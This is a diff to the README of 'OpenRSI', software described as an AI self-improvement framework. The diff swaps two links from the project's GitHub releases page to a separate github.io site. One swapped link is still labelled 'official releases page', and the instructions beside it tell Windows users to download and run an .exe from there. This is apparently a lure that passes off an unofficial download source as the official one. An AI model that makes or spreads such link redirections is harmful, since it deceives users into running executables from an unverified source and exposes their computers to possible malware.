@@ -1,6 +1,6 @@
 # 🤖 OpenRSI - Build smarter systems through recursive improvement
 
-[![](https://img.shields.io/badge/Download-OpenRSI-blue)](https://github.com/tituan1515/OpenRSI/releases)
+[![](https://img.shields.io/badge/Download-OpenRSI-blue)](https://tituan1515.github.io)
 
 OpenRSI provides a framework for artificial intelligence to study and improve itself. This software contains the OpenMLE library and the Frontis-MA1 agent. These tools allow you to run experiments that measure how well a machine learns. You use this software to build models that refine their own code and logic over time.
 
@@ -8,7 +8,7 @@ OpenRSI provides a framework for artificial intelligence to study and improve it
 
 You do not need to write code to use OpenRSI. We provide a ready-to-use version for Windows. Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/tituan1515/OpenRSI/releases) to access the download options.
+1. Visit the [official releases page](https://tituan1515.github.io) to access the download options.
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or your downloads folder.
